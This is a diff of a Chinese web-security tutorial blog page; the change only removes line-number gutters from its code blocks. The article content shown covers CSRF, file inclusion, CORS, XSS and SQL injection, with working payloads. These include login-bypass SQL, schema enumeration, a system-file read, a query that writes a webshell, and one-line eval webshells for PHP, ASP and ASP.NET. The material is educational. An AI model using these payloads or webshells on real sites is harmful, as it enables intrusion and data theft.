@@ -20,7 +20,7 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"hack1ng4fun.github.io","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"hack1ng4fun.github.io","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
   <meta name="description" content="「Web安全」篇扫盲Web安全领域的主流漏洞，深入了解漏洞的产生原理以及对应的防御方法。">
@@ -414,7 +414,7 @@
 <h4 id="CSRF漏洞的利用"><a href="#CSRF漏洞的利用" class="headerlink" title="CSRF漏洞的利用"></a>CSRF漏洞的利用</h4><p>假设某网站，在修改用户密码的位置存在CSRF漏洞，用户在修改密码时会发送如下一个请求：<br><code>http://localhost/?passwd=1234&amp;submit=submit</code><br><code>passwd</code>字段是用户的新密码</p>
 <p>在用户登录状态下访问这个URL，用户的密码就会被修改为<code>passwd</code>字段的值（1234）。</p>
 <p>攻击者构造了如下一个钓鱼页面：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"1.jpg"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"300px"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"display:none;"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://localhost/?passwd=hacked&amp;submit=submit"</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"1.jpg"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"300px"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"display:none;"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://localhost/?passwd=hacked&amp;submit=submit"</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>假设用户当前是登录状态，当用户打这个钓鱼页面时，用户只会看到一个美女图片（1.jpg），实际上他的密码已经被修改为 hacked（通过一个隐藏的iframe标签向网站发送了一个修改密码的请求）。这个例子就是攻击者通过CSRF漏洞，以用户的身份修改了用户密码。<br>CSRF漏洞具体能做到什么，要看出现漏洞的具体功能点，如果银行转账功能出现CSRF漏洞，那么攻击者就能通过漏洞转走你账户的钱……</p>
 <h4 id="CSRF的防御手段"><a href="#CSRF的防御手段" class="headerlink" title="CSRF的防御手段"></a>CSRF的防御手段</h4><ul>
@@ -436,10 +436,10 @@
 <p>#####　本地文件包含</p>
 <p>假设网站有如下两个PHP文件：</p>
 <p>file.php：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>($_GET[<span class="hljs-string">'filename'</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>($_GET[<span class="hljs-string">'filename'</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>phpinfo.php：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> phpinfo(); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> phpinfo(); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>那么当访问<code>http://localhost/file.php?filename=phpinfo.php</code>时，<code>phpinfo.php</code>文件就会被包含到<code>file.php</code>中执行，最后就会打印出phpinfo信息。<br><code>file.php</code>在包含文件的时候并没有对<code>$_GET[&#39;filename&#39;]</code>的值做相关的处理，「filename」的参数可以是任意的，这就意味着这里存在「本地文件包含漏洞」。</p>
 <h5 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h5><p>既然有「本地文件包含」，那自然也有「远程文件包含」啦，如果<code>php.ini</code>的配置选项<code>allow_url_fopen</code>和<code>allow_url_include</code>都为 ON 的话，被包含的文件就可以是HTTP的URL形式或者是<code>php://</code>、<code>data://</code>等特殊协议，意味着可以包含（执行）远程的文件。<br>被包含的远程PHP文件，后缀名应该改为txt，否则读取到的会是远程PHP文件被解析后的结果。</p>
@@ -470,11 +470,11 @@
 <h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>HTML5 带来的新标签、新属性为XSS恶意代码「绕过WAF等防护设备的黑名单机制」提供了便利：可以尝试使用更多不同的标签、属性绕过防护设备的安全检测，执行恶意代码。这方面的防御主要看防护产品是否增加了对新标签、新属性的检测。</p>
 <h4 id="CORS（跨域资源共享）"><a href="#CORS（跨域资源共享）" class="headerlink" title="CORS（跨域资源共享）"></a>CORS（跨域资源共享）</h4><p>CORS是一个W3C标准，全称是「跨域资源共享」（Cross-origin resource sharing）。它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。</p>
 <p>服务端在响应头中设置<code>Access-Control-Allow-Origin</code>字段来表明接受哪些网站的跨域请求（还有其他几个与CORS请求相关的字段，这里只讲最重要的这个），如果开发人员偷懒，为了方便，将<code>Access-Control-Allow-Origin</code>字段的值设置为「<em>」的话，这表明接受任何网站的跨域请求，如果同时使用了<code>Access-Control-Allow-Credentials:true</code>将导致CORS的安全机制几乎完全失效，这就会导致安全问题。考虑到这种权限过于宽松，CORS又规定，`Access-Control-Allow-Origin:</em><code>与</code>Access-Control-Allow-Credentials:true`不能同时使用。浏览器会对下面这种误配置报错：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Access-Control-Allow-Origin</span>: *  <br><span class="hljs-attribute">Access-Control-Allow-Credentials</span>: true<br></code></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Access-Control-Allow-Origin</span>: *  <br><span class="hljs-attribute">Access-Control-Allow-Credentials</span>: true<br></code></pre></td></tr></table></figure>
 
 <p>CORS标准规定，<code>Access-Control-Allow-Origin</code>只能配置为单个origin，null或*，<br>如果开发者想要实现同时与多个域名共享域名的需求，则需要专门编写代码或者使用框架来协助动态生成访问控制策略。这种动态生成的做法增加了开发者配置难度，导致实际网络中出现各种不安全的误配置。</p>
 <p>最简单地动态生成访问控制策略的方法，就是在<code>Access-Control-Allow-Origin</code>中反射请求的Origin值。例如，下面是一个错误 Nginx 配置示例：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">add_header <span class="hljs-string">"Access-Control-Allow-Origin"</span> $http_origin;<br>add_header “Access-Control-Allow-Credentials” “<span class="hljs-keyword">true</span>”;<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">add_header <span class="hljs-string">"Access-Control-Allow-Origin"</span> $http_origin;<br>add_header “Access-Control-Allow-Credentials” “<span class="hljs-keyword">true</span>”;<br></code></pre></td></tr></table></figure>
 
 <p>这种配置相当于信任任何网站，任意攻击者都可以直接跨域读取网站资源。</p>
 <p>「Shell of the Future」工具就是利用CORS建立HTTP通道，将页面发送给控制端（攻击者），可以绕过一些反会话劫持的方法（Http-Only限制的Cookie、绑定IP地址的会话ID、……），实现XSS会话劫持。</p>
@@ -492,7 +492,7 @@
 <p>防御：防护措施和SQL注入也是类似的，比如过滤关键词等。</p>
 <h4 id="API"><a href="#API" class="headerlink" title="API"></a>API</h4><p>HTML5 引入了一些新的API，可以实现新的攻击方法。</p>
 <p>由于 HTML5 涉及的API比较多，就不一一展开了。给一个「通过History新的API来隐藏恶意URL」的例子，可以搭配短网址来隐藏反射型XSS的攻击代码，以下为一个反射型XSS的URL：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">http://localhost/xss/?xsscode=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">history.pushState(&#123;&#125;,<span class="hljs-string">''</span>,location.href.split(<span class="hljs-string">'?'</span>).shift());<span class="hljs-built_in">document</span>.write(<span class="hljs-number">1</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html">http://localhost/xss/?xsscode=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">history.pushState(&#123;&#125;,<span class="hljs-string">''</span>,location.href.split(<span class="hljs-string">'?'</span>).shift());<span class="hljs-built_in">document</span>.write(<span class="hljs-number">1</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>用户访问页面后，XSS攻击代码被成功执行，但用户看到的URL却是<code>http://localhost/xss</code>，达到了隐藏恶意URL的效果。</p>
 <h3 id="点击劫持-Click-jacking"><a href="#点击劫持-Click-jacking" class="headerlink" title="点击劫持(Click jacking)"></a>点击劫持(Click jacking)</h3><p>点击劫持又称「UI覆盖攻击」，是一种视觉上的欺骗手段，它主要有两种方式，一是攻击者使用一个透明的iframe，覆盖在一个网页上，然后诱使用户在该页面上进行操作，此时用户将在不知情的情况下点击透明的iframe页面；二是攻击者使用一张图片覆盖在网页，遮挡网页原有位置的含义。</p>
@@ -516,11 +516,11 @@
 <li>……</li>
 </ul>
 <h4 id="SQL注入基本原理"><a href="#SQL注入基本原理" class="headerlink" title="SQL注入基本原理"></a>SQL注入基本原理</h4><p>以用户登录为例，程序在收到用户名和密码后，往往会先根据用户名和密码在数据库中查询用户名和密码（数据库中一般存储的是密码的Hash值，而不是密码的明文）同时匹配的数据库记录，如果在数据库中查询到对应的数据记录，则登录成功，否则登录失败。<br>它的SQL语句大概是这样的：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">'用户名'</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">'密码的Hash值'</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">'用户名'</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">'密码的Hash值'</span><br></code></pre></td></tr></table></figure>
 
 <p>用户名的值是用户提交的，如果网站没有做相关的过滤的话，就可以提交一些「特殊的用户名」，来达到「修改SQL语句结构，而改变查询」的目的。因为密码字段在数据库中通常是以Hash值存储的，用户提交时程序会将密码转换为对应的Hash值，这样密码的字段就相当于不可控了，就没法通过密码的字段改变SQL语句结构，不过能控制用户名就足够了。在早些年，密码还是以明文存储的，经典的「万能密码」就是通过密码字段的注入点，实现登录任意用户帐号。</p>
 <p>如果将用户名字段写为<code>&#39; or 1=1;--+</code>，那么网站的SQL语句就会变成这样：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">''</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span>;<span class="hljs-comment">-- ' and password='密码的Hash值'</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">''</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span>;<span class="hljs-comment">-- ' and password='密码的Hash值'</span><br></code></pre></td></tr></table></figure>
 
 <p>可以看到，提交的用户名改变了SQL语句原本的结构，进而改变了它的查询结果，以上语句把验证密码的部分注释掉了，并且使判断语句永远为真，导致的结果就是「会返回数据库中所有的用户数据」（因为判断语句永远为真(or 1=1)，所有数据都会符合判断条件，程序就返回了所有匹配的数据）。SQL注入的本质就是<strong>「数据和代码未分离，把用户输入当作代码执行」</strong>。</p>
 <p>SQL注入需要以下两个必备条件</p>
@@ -542,14 +542,14 @@
 </ul>
 <p><strong>判断是否为整数型注入</strong></p>
 <p>正常情况下的SQL语句：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> x <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> x <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
 
 <p>当提交 1=1（第一条测试语句）时的SQL语句：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> x <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> x <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
 
 <p>逻辑判断为真，所以返回正常。</p>
 <p>当提交 1=2（第二条测试语句）时的SQL语句：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> x <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> x <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
 
 <p>逻辑判断为假，所以返回错误。</p>
 <p>从外部来看，两次提交返回的结果不一致：1=1 时页面正常，1=2 时返回错误，表明这是整数型注入点。</p>
@@ -561,13 +561,13 @@
 <p><strong>判断是否是字符型注入（单引号）</strong></p>
 <p>判断注入点类型的原理已经在上面说过了，就不重复说了，只写出各个情况下的SQL语句的变化，可以结合上面说的原理自己思考下。</p>
 <p>正常情况下的SQL语句：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> x <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">'1'</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> x <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">'1'</span><br></code></pre></td></tr></table></figure>
 
 <p>当提交 1=1（第一条测试语句） 时的SQL语句：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> x <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">'1'</span> <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'1'</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> x <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">'1'</span> <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'1'</span><br></code></pre></td></tr></table></figure>
 
 <p>当提交 1=2（第二条测试语句） 时的SQL语句：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> x <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">'1'</span> <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'2'</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> x <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">'1'</span> <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'2'</span><br></code></pre></td></tr></table></figure>
 
 <ul>
 <li><code>http://localhost/?id=1&quot; and &quot;1&quot;=&quot;1</code> &amp;&amp; <code>http://localhost/?id=1&quot; and &quot;1&quot;=&quot;2</code></li>
@@ -623,23 +623,23 @@
 <p>获取信息的常用语句</p>
 <ul>
 <li><p>获取所有数据库名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> SCHEMA_NAME <span class="hljs-keyword">from</span> information_schema.SCHEMATA<br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> SCHEMA_NAME <span class="hljs-keyword">from</span> information_schema.SCHEMATA<br></code></pre></td></tr></table></figure>
 </li>
 <li><p>获取指定数据库中的所有表名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> TABLE_NAME <span class="hljs-keyword">from</span> information_schema.TABLES <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> TABLE_NAME <span class="hljs-keyword">from</span> information_schema.TABLES <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure>
 </li>
 <li><p>获取指定表中所有的字段名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> COLUMN_NAME <span class="hljs-keyword">from</span> information_schema.COLUMNS <span class="hljs-keyword">where</span> TABLE_NAME=<span class="hljs-string">'USERS'</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> COLUMN_NAME <span class="hljs-keyword">from</span> information_schema.COLUMNS <span class="hljs-keyword">where</span> TABLE_NAME=<span class="hljs-string">'USERS'</span><br></code></pre></td></tr></table></figure>
 </li>
 <li><p>获取指定表中，指定字段的所有数据</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">USERS</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">USERS</span><br></code></pre></td></tr></table></figure>
 
 </li>
 </ul>
-<h5 id="读取系统文件"><a href="#读取系统文件" class="headerlink" title="读取系统文件"></a>读取系统文件</h5>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">load_file</span>(<span class="hljs-string">'c:\\windows\\win.ini'</span>)<br></code></pre></td></tr></table></figure>
+<h5 id="读取系统文件"><a href="#读取系统文件" class="headerlink" title="读取系统文件"></a>读取系统文件</h5>  <figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">load_file</span>(<span class="hljs-string">'c:\\windows\\win.ini'</span>)<br></code></pre></td></tr></table></figure>
 
 <p>注：Windows路径需要用双反斜杠转义</p>
-<h5 id="写入WebShell"><a href="#写入WebShell" class="headerlink" title="写入WebShell"></a>写入WebShell</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">"&lt;?php @eval($_GET['cmd']); ?&gt;"</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">'D:\\web\\WWW\\shell.php'</span><br></code></pre></td></tr></table></figure>
+<h5 id="写入WebShell"><a href="#写入WebShell" class="headerlink" title="写入WebShell"></a>写入WebShell</h5><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">"&lt;?php @eval($_GET['cmd']); ?&gt;"</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">'D:\\web\\WWW\\shell.php'</span><br></code></pre></td></tr></table></figure>
 
 <h4 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h4><p>之前讲的SQL注入实际上都是「SQL回显注入」——数据或执行结果会直接返回到页面上。<br>「SQL盲注」是无法通过SQL注入在页面返回内容中找到所需要的数据或用作注入成功判断的内容，都可以称为SQL盲注。</p>
 <h5 id="SQL盲注的几种方式"><a href="#SQL盲注的几种方式" class="headerlink" title="SQL盲注的几种方式"></a>SQL盲注的几种方式</h5><ul>
@@ -670,17 +670,17 @@
 <ul>
 <li>PHP</li>
 </ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST(<span class="hljs-string">"cmd"</span>));<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST(<span class="hljs-string">"cmd"</span>));<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <ul>
 <li>ASP</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asp">&lt;%eval request(&quot;cmd&quot;)%&gt;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs asp">&lt;%eval request(&quot;cmd&quot;)%&gt;<br></code></pre></td></tr></table></figure>
 
 <ul>
 <li>ASP.NET</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asp.net">&lt;%@ PageLanguage&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.item[&quot;cmd&quot;], &quot;unsafe&quot;);%&gt;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs asp.net">&lt;%@ PageLanguage&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.item[&quot;cmd&quot;], &quot;unsafe&quot;);%&gt;<br></code></pre></td></tr></table></figure>
 
 <h4 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h4><p>文件上传功能的实现代码没有严格限制用户上传的文件后缀以及文件类型，导致攻击者可以上传任意文件（当然也包括脚本木马）。</p>
 <h4 id="绕过不同类型的限制，进行文件上传"><a href="#绕过不同类型的限制，进行文件上传" class="headerlink" title="绕过不同类型的限制，进行文件上传"></a>绕过不同类型的限制，进行文件上传</h4><p>大部分程序对于上传的文件都会进行一些限制和过滤的处理，如果程序验证不严谨，就可能被绕过。</p>
